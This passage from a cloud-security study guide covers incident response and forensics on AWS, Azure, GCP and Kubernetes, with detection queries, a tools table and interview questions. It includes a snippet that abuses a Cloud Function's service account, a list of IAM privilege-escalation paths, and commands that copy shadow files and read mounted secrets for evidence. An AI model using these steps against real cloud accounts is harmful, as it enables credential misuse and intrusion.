| where Category == "FunctionAppLogs"
| where Level in ("Error", "Warning")
| project TimeGenerated, Resource, Message

AzureActivity
| where OperationNameValue contains "MICROSOFT.WEB/SITES"
| where OperationNameValue contains "WRITE" or OperationNameValue contains "DELETE"
| project TimeGenerated, Caller, OperationNameValue, Resource
```

### GCP Cloud Functions Security

```
CLOUD FUNCTIONS ATTACK SURFACE:
├── HTTP trigger without authentication
├── Service account abuse
├── Environment variable secrets
├── Pub/Sub message injection
├── Cloud Storage trigger abuse
└── VPC connector exposure

SERVICE ACCOUNT ABUSE:
# Cloud Function gets service account token automatically
from google.auth import default
credentials, project = default()

# Use credentials to access GCP resources
from google.cloud import storage
client = storage.Client(credentials=credentials)
for bucket in client.list_buckets():
    print(bucket.name)

DETECTION:
resource.type="cloud_function"
protoPayload.methodName="google.cloud.functions.v1.CloudFunctionsService.CallFunction"

resource.type="cloud_function"
severity>=WARNING
```

---

## Cloud Forensics

### AWS Forensics

```
EVIDENCE SOURCES:
├── CloudTrail (API activity)
├── VPC Flow Logs (network)
├── S3 Access Logs
├── CloudWatch Logs
├── GuardDuty Findings
├── Security Hub
├── Config (configuration history)
├── EC2 Instance Metadata
├── EBS Snapshots
├── Memory acquisition (SSM, EC2 Serial Console)
└── Lambda invocation logs

INCIDENT RESPONSE STEPS:

1. PRESERVE EVIDENCE
# Stop instance (don't terminate!)
aws ec2 stop-instances --instance-ids i-xxx

# Create EBS snapshot
aws ec2 create-snapshot --volume-id vol-xxx --description "Forensic-$(date +%Y%m%d)"

# Create AMI for complete preservation
aws ec2 create-image --instance-id i-xxx --name "Forensic-$(date +%Y%m%d)"

# Preserve CloudTrail logs (copy to forensic bucket)
aws s3 sync s3://cloudtrail-bucket s3://forensic-bucket/cloudtrail/

# Preserve VPC Flow Logs
aws logs create-export-task \
    --task-name "vpc-flow-export" \
    --log-group-name "/aws/vpc/flowlogs" \
    --from $(date -d "7 days ago" +%s)000 \
    --to $(date +%s)000 \
    --destination "forensic-bucket" \
    --destination-prefix "flowlogs"

2. ISOLATE COMPROMISED RESOURCES
# Create isolation security group
aws ec2 create-security-group \
    --group-name "Forensic-Isolation" \
    --description "No inbound/outbound"
aws ec2 revoke-security-group-egress \
    --group-id sg-xxx \
    --protocol all

# Apply to instance
aws ec2 modify-instance-attribute \
    --instance-id i-xxx \
    --groups sg-isolation

# Disable compromised IAM credentials
aws iam update-access-key \
    --access-key-id AKIA... \
    --status Inactive \
    --user-name compromised-user

# Revoke IAM role sessions
aws iam put-role-policy \
    --role-name compromised-role \
    --policy-name DenyAll \
    --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Deny","Action":"*","Resource":"*","Condition":{"DateLessThan":{"aws:TokenIssueTime":"2026-02-24T00:00:00Z"}}}]}'

3. ACQUIRE DISK FOR ANALYSIS
# Create volume from snapshot
aws ec2 create-volume \
    --snapshot-id snap-xxx \
    --availability-zone us-east-1a

# Attach to forensic workstation
aws ec2 attach-volume \
    --volume-id vol-xxx \
    --instance-id i-forensic \
    --device /dev/xvdf

4. MEMORY ACQUISITION
# Using SSM Run Command
aws ssm send-command \
    --instance-ids i-xxx \
    --document-name "AWS-RunShellScript" \
    --parameters 'commands=["sudo insmod /tmp/lime.ko path=/tmp/memory.lime format=lime"]'

# Download memory dump
aws s3 cp s3://forensic-bucket/memory.lime .

5. ANALYZE CLOUDTRAIL
# Export to Athena for analysis
# See CloudTrail queries in AWS section above

EC2 FORENSIC ANALYSIS:
# Mount EBS volume read-only
sudo mount -o ro,noexec /dev/xvdf1 /mnt/evidence

# Create timeline
log2timeline.py /mnt/evidence/timeline.plaso /mnt/evidence

# Extract artifacts
sudo cp -r /mnt/evidence/var/log /evidence/logs
sudo cp -r /mnt/evidence/home/*/.bash_history /evidence/
sudo cp -r /mnt/evidence/etc/passwd /evidence/
sudo cp -r /mnt/evidence/etc/shadow /evidence/
```

### Azure Forensics

```
EVIDENCE SOURCES:
├── Azure Activity Log (90 days)
├── Azure AD Sign-in Logs
├── Azure AD Audit Logs
├── Diagnostic Logs (per resource)
├── NSG Flow Logs
├── Storage Analytics Logs
├── VM Disk Snapshots
├── Azure Security Center Alerts
├── Microsoft Defender for Cloud
└── Log Analytics Workspace

INCIDENT RESPONSE STEPS:

1. PRESERVE EVIDENCE
# Create disk snapshot
az snapshot create \
    --name "forensic-snap-$(date +%Y%m%d)" \
    --resource-group RG \
    --source "/subscriptions/xxx/resourceGroups/RG/providers/Microsoft.Compute/disks/DISK"

# Export Activity Log
az monitor activity-log list \
    --start-time 2026-02-17 \
    --end-time 2026-02-24 \
    --output json > activity_log.json

# Export Sign-in Logs (via Graph API or portal)
# Portal: Azure AD > Sign-in logs > Download

# Preserve Network Watcher packet capture
az network watcher packet-capture create \
    --resource-group RG \
    --vm VM-NAME \
    --name "forensic-capture" \
    --storage-account forensicsa

2. ISOLATE RESOURCES
# Create isolation NSG
az network nsg create --name Isolation-NSG --resource-group RG
az network nsg rule create \
    --nsg-name Isolation-NSG \
    --resource-group RG \
    --name DenyAllInbound \
    --priority 100 \
    --direction Inbound \
    --access Deny \
    --source-address-prefixes '*'

# Apply to NIC
az network nic update \
    --name VM-NIC \
    --resource-group RG \
    --network-security-group Isolation-NSG

# Disable user
az ad user update --id USER-ID --account-enabled false

# Revoke sessions
az rest --method POST \
    --uri "https://graph.microsoft.com/v1.0/users/USER-ID/revokeSignInSessions"

3. DISK ACQUISITION
# Create managed disk from snapshot
az disk create \
    --name forensic-disk \
    --resource-group RG \
    --source forensic-snap

# Generate SAS URL for download
az disk grant-access \
    --name forensic-disk \
    --resource-group RG \
    --access-level Read \
    --duration-in-seconds 3600

# Download disk
azcopy copy "<SAS-URL>" forensic-disk.vhd

KUSTO QUERIES FOR INVESTIGATION:
// Failed sign-ins followed by success (password spray indicator)
let FailedAttempts = SigninLogs
| where ResultType != 0
| summarize FailCount=count() by UserPrincipalName, IPAddress;
let SuccessfulAttempts = SigninLogs
| where ResultType == 0
| summarize by UserPrincipalName, IPAddress, TimeGenerated;
FailedAttempts
| join kind=inner SuccessfulAttempts on UserPrincipalName, IPAddress
| where FailCount > 5

// Resource deletions
AzureActivity
| where OperationNameValue contains "DELETE"
| project TimeGenerated, Caller, OperationNameValue, Resource
| order by TimeGenerated desc

// Role assignments
AzureActivity
| where OperationNameValue == "MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE"
| project TimeGenerated, Caller, Properties
```

### GCP Forensics

```
EVIDENCE SOURCES:
├── Cloud Audit Logs (Admin Activity, Data Access)
├── VPC Flow Logs
├── Firewall Rules Logs
├── Cloud Storage Access Logs
├── Compute Engine Serial Console Output
├── Disk Snapshots
├── Cloud Monitoring Metrics
├── Cloud Security Command Center
└── Access Transparency Logs

INCIDENT RESPONSE STEPS:

1. PRESERVE EVIDENCE
# Create disk snapshot
gcloud compute disks snapshot DISK-NAME \
    --snapshot-names forensic-snap-$(date +%Y%m%d) \
    --zone us-central1-a

# Export logs to Cloud Storage
gcloud logging read \
    "resource.type=gce_instance AND logName:cloudaudit.googleapis.com" \
    --format json > audit_logs.json

# Export to BigQuery for analysis
gcloud logging sinks create forensic-sink \
    bigquery.googleapis.com/projects/PROJECT/datasets/forensics \
    --log-filter='resource.type="gce_instance"'

2. ISOLATE RESOURCES
# Remove external IP
gcloud compute instances delete-access-config INSTANCE \
    --access-config-name "External NAT" \
    --zone us-central1-a

# Update firewall to deny all
gcloud compute firewall-rules create deny-all-forensic \
    --direction=INGRESS \
    --priority=0 \
    --network=VPC \
    --action=DENY \
    --rules=all \
    --target-tags=compromised

# Add tag to instance
gcloud compute instances add-tags INSTANCE \
    --tags=compromised \
    --zone us-central1-a

# Disable service account
gcloud iam service-accounts disable SA@PROJECT.iam.gserviceaccount.com

# Delete service account keys
gcloud iam service-accounts keys delete KEY-ID \
    --iam-account=SA@PROJECT.iam.gserviceaccount.com

3. DISK ACQUISITION
# Create disk from snapshot
gcloud compute disks create forensic-disk \
    --source-snapshot forensic-snap \
    --zone us-central1-a

# Attach to forensic VM
gcloud compute instances attach-disk forensic-vm \
    --disk forensic-disk \
    --mode ro \
    --zone us-central1-a

LOG ANALYSIS QUERIES (BigQuery):
-- API calls by user
SELECT
    protopayload_auditlog.authenticationInfo.principalEmail as user,
    protopayload_auditlog.methodName as method,
    COUNT(*) as count
FROM `PROJECT.forensics.cloudaudit_googleapis_com_activity_*`
WHERE timestamp > TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 7 DAY)
GROUP BY user, method
ORDER BY count DESC;

-- Service account key creation
SELECT
    timestamp,
    protopayload_auditlog.authenticationInfo.principalEmail,
    protopayload_auditlog.methodName,
    protopayload_auditlog.resourceName
FROM `PROJECT.forensics.cloudaudit_googleapis_com_activity_*`
WHERE protopayload_auditlog.methodName = 'google.iam.admin.v1.CreateServiceAccountKey'
ORDER BY timestamp DESC;

-- IAM policy changes
SELECT
    timestamp,
    protopayload_auditlog.authenticationInfo.principalEmail,
    protopayload_auditlog.methodName,
    protopayload_auditlog.servicedata_v1_iam.policyDelta
FROM `PROJECT.forensics.cloudaudit_googleapis_com_activity_*`
WHERE protopayload_auditlog.methodName LIKE '%SetIamPolicy%'
ORDER BY timestamp DESC;
```

### Kubernetes Forensics

```
K8S EVIDENCE SOURCES:
├── API Server Audit Logs
├── Container Logs (stdout/stderr)
├── Pod Events
├── etcd Snapshots
├── Node-level Logs (kubelet, container runtime)
├── Network Policy Logs
├── Falco Alerts (if deployed)
├── Service Mesh Logs (Istio, etc.)
└── Container Filesystem

INCIDENT RESPONSE STEPS:

1. PRESERVE EVIDENCE
# Get pod logs
kubectl logs POD -n NAMESPACE --all-containers > pod_logs.txt
kubectl logs POD -n NAMESPACE --previous > previous_logs.txt  # Previous container

# Get pod events
kubectl describe pod POD -n NAMESPACE > pod_events.txt
kubectl get events -n NAMESPACE --sort-by='.lastTimestamp' > namespace_events.txt

# Export pod spec (for analysis of security context)
kubectl get pod POD -n NAMESPACE -o yaml > pod_spec.yaml

# Snapshot etcd (if accessible)
etcdctl snapshot save etcd_backup.db

# Copy files from container (before termination)
kubectl cp NAMESPACE/POD:/path/to/file ./evidence/

2. ISOLATE COMPROMISED POD
# Apply network policy to isolate
cat <<EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: isolate-compromised
  namespace: NAMESPACE
spec:
  podSelector:
    matchLabels:
      app: compromised-app
  policyTypes:
  - Ingress
  - Egress
EOF

# Alternatively, cordon and drain node
kubectl cordon NODE
kubectl drain NODE --ignore-daemonsets --delete-emptydir-data

# Delete compromised pod (after evidence collection)
kubectl delete pod POD -n NAMESPACE

3. ANALYZE CONTAINER
# Get shell into container (if still running)
kubectl exec -it POD -n NAMESPACE -- /bin/sh

# Check running processes
ps aux

# Check network connections
netstat -tulpn
cat /proc/net/tcp

# Check file system
ls -la /tmp
find / -mtime -1 -type f 2>/dev/null  # Files modified in last day

# Check environment variables (may contain secrets)
env

# Check mounted secrets
ls -la /var/run/secrets/kubernetes.io/serviceaccount/

4. NODE-LEVEL FORENSICS
# SSH to node
ssh NODE

# Check container runtime logs
journalctl -u containerd -n 1000
journalctl -u docker -n 1000

# Check kubelet logs
journalctl -u kubelet -n 1000

# List all containers on node
crictl ps -a
docker ps -a

# Inspect specific container
crictl inspect CONTAINER-ID
docker inspect CONTAINER-ID

# Get container filesystem
crictl export CONTAINER-ID filesystem.tar

AUDIT LOG ANALYSIS:
# Suspicious activities to look for
├── Service account token requests
├── Secrets access
├── Pod creation with privileged context
├── Exec into pods
├── RBAC modifications
├── Namespace creation
└── Config map modifications in kube-system

# Query examples (Splunk)
index=k8s_audit verb="create" objectRef.resource="pods"
| spath "requestObject.spec.containers{}.securityContext"
| search privileged=true

index=k8s_audit verb IN ("get", "list") objectRef.resource="secrets"
| stats count by user.username, objectRef.namespace, objectRef.name
| where count > 10

CONTAINER FORENSICS:
# Create container image for offline analysis
docker commit CONTAINER forensic-image:latest
docker save forensic-image:latest -o forensic-image.tar

# Analyze with dive (layer analysis)
dive forensic-image:latest

# Extract and analyze filesystem
mkdir container_fs
tar -xf forensic-image.tar -C container_fs

# Analyze with Autopsy or manual review
# Look for:
├── Unusual binaries in /tmp, /var/tmp
├── Modified system binaries
├── New user accounts
├── SSH keys
├── Cron jobs
├── Network configuration changes
└── Suspicious scripts
```

---

## Cloud Security Tools

```
ASSESSMENT & SCANNING:
┌─────────────────┬────────────────────────────────────────────────────┐
│ Tool            │ Purpose                                            │
├─────────────────┼────────────────────────────────────────────────────┤
│ Prowler         │ AWS/Azure/GCP security assessment                  │
│ ScoutSuite      │ Multi-cloud security auditing                      │
│ CloudSploit     │ Cloud security scanning                            │
│ Steampipe       │ SQL queries for cloud resources                    │
│ Cartography     │ Infrastructure graph analysis                      │
│ CloudMapper     │ AWS network visualization                          │
│ Cloudsplaining  │ AWS IAM policy analysis                            │
│ Parliament      │ AWS IAM linting                                    │
│ IAM Analyzer    │ AWS access analysis                                │
└─────────────────┴────────────────────────────────────────────────────┘

OFFENSIVE TOOLS:
┌─────────────────┬────────────────────────────────────────────────────┐
│ Tool            │ Purpose                                            │
├─────────────────┼────────────────────────────────────────────────────┤
│ Pacu            │ AWS exploitation framework                         │
│ Stratus Red Team│ Cloud attack simulation                            │
│ CloudGoat       │ Vulnerable AWS environment                         │
│ AzureGoat       │ Vulnerable Azure environment                       │
│ GCPGoat         │ Vulnerable GCP environment                         │
│ ROADtools       │ Azure AD enumeration                               │
│ AzureHound      │ Azure AD attack path mapping                       │
│ MicroBurst      │ Azure security toolkit                             │
│ PowerZure       │ Azure offensive toolkit                            │
└─────────────────┴────────────────────────────────────────────────────┘

KUBERNETES TOOLS:
┌─────────────────┬────────────────────────────────────────────────────┐
│ Tool            │ Purpose                                            │
├─────────────────┼────────────────────────────────────────────────────┤
│ kube-hunter     │ K8s penetration testing                            │
│ kube-bench      │ CIS benchmark scanning                             │
│ kubeaudit       │ Security auditing                                  │
│ Trivy           │ Container/K8s vulnerability scanning               │
│ Falco           │ Runtime threat detection                           │
│ Tetragon        │ eBPF-based security observability                  │
│ Kubescape       │ K8s security scanning                              │
│ Kubei           │ K8s runtime security                               │
│ kube-forensics  │ Container forensics                                │
│ Sysdig          │ Container visibility                               │
└─────────────────┴────────────────────────────────────────────────────┘

EXAMPLE COMMANDS:

# Prowler AWS scan
prowler aws --severity critical high -M json-ocsf -o prowler_report

# ScoutSuite multi-cloud
scout azure --all-tenants
scout aws --regions us-east-1,us-west-2
scout gcp --all-projects

# Steampipe query
steampipe query "select * from aws_iam_user where mfa_enabled = false"

# kube-bench CIS scan
kube-bench run --targets master,node,etcd

# Trivy K8s scan
trivy k8s --report summary cluster

# Falco runtime detection
falco -r /etc/falco/falco_rules.yaml
```

---

## Interview Questions - Cloud Security

1. **How do you detect compromised AWS access keys?**
   - CloudTrail: Unusual API calls, regions, times
   - IP address changes (impossible travel)
   - API calls not matching user's normal pattern
   - Access from known malicious IPs
   - Programmatic access from console-only users
   - GuardDuty findings

2. **Explain IAM privilege escalation in AWS**
   - iam:CreatePolicyVersion → Create admin policy
   - iam:AttachUserPolicy → Attach admin to self
   - iam:PassRole + service creation → Run service with admin role
   - iam:UpdateAssumeRolePolicy → Allow self to assume admin role
   - Prevention: Use SCPs, monitor CloudTrail

3. **How would you respond to a compromised K8s cluster?**
   - Identify compromised pods/nodes
   - Network isolate with NetworkPolicy
   - Collect evidence (logs, pod specs, container fs)
   - Check RBAC for privilege escalation
   - Review audit logs for attack timeline
   - Rotate secrets and tokens
   - Rebuild affected workloads

4. **What are the challenges of cloud forensics?**
   - Volatile infrastructure (auto-scaling, ephemeral)
   - Limited disk access (PaaS, SaaS)
   - Multi-tenant environment
   - Log retention limits
   - Jurisdictional issues (data location)
   - Chain of custody in shared environment
   - Timestamp correlation across services

5. **How do you secure serverless functions?**
   - Least privilege IAM roles
   - No secrets in environment variables
   - Input validation (event injection)
   - Dependency scanning
   - Enable VPC if needed
   - Set appropriate timeout/memory limits
   - Monitor invocation patterns
   - Code signing

---

**Next: [12_WEB_API_SECURITY.md](./12_WEB_API_SECURITY.md) →**
